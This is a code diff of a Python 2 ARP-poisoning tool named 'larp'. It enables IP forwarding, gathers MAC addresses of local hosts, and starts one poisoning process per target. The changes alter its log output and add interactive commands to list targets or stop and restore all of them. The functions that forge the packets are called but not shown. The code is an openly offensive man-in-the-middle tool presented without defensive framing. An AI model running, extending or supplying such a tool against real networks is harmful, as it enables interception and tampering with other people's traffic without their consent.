@@ -74,6 +74,7 @@ class larp():
                 with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                     f.write("1")
                     f.close()
+            print colored("[*] Retreiving mac addrs", "green")
             for ip in temp_ip:
                 temp = get_mac(ip)
                 if temp == None:
@@ -81,7 +82,6 @@ class larp():
                 elif ip == gateway_ip:
                     print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                 else:
-                    print colored("[^] %s => %s"% (ip, temp), "blue")
                     self.t_ip.append(ip)
                     self.t_mac[ip] = temp
         except:
@@ -96,23 +96,33 @@ class larp():
         t_id = 0    # thread id
         id_map = dict()
         print colored("[*] Main Thread", "green")
+        print colored("[^] Starting ARP poison", "blue")
         for ip in self.t_ip:
             self.thread_array.append(multiprocessing.Process(target=poison,\
             args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
             self.thread_array[t_id].start()
-            print colored("[^] ID: %d / Starting to ARP poison %s" % (t_id, ip), "blue")
             id_map[t_id] = [ip, self.t_mac[ip] ]
             t_id += 1
-        print colored("[*] Main menu:\n[*] Enter the ID of the arp poison you want to kill", "green")
+        print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")
         while len(id_map):
             buf = raw_input('#>')
             try:
-                self.thread_array[int(buf)].terminate()
-                restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
-                print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
-                del id_map[int(buf)]
+                if "all" in buf or "a" == buf:
+                    for i in xrange(0, t_id):
+                        self.thread_array[i].terminate()
+                        restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
+                        print colored("[^] Restored: %s" % id_map[i][0], "blue")
+                        del id_map[i]
+                elif "list" in buf or "l" == buf:
+                    for i in xrange(0, t_id):
+                        print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
+                else:
+                    self.thread_array[int(buf)].terminate()
+                    restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
+                    print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
+                    del id_map[int(buf)]
             except:
-                print colored("[!] You provided me wrong data", "red")
+                print colored("[!] Available commands: all - list", "red")
         for thread in self.thread_array:
             thread.join()
 
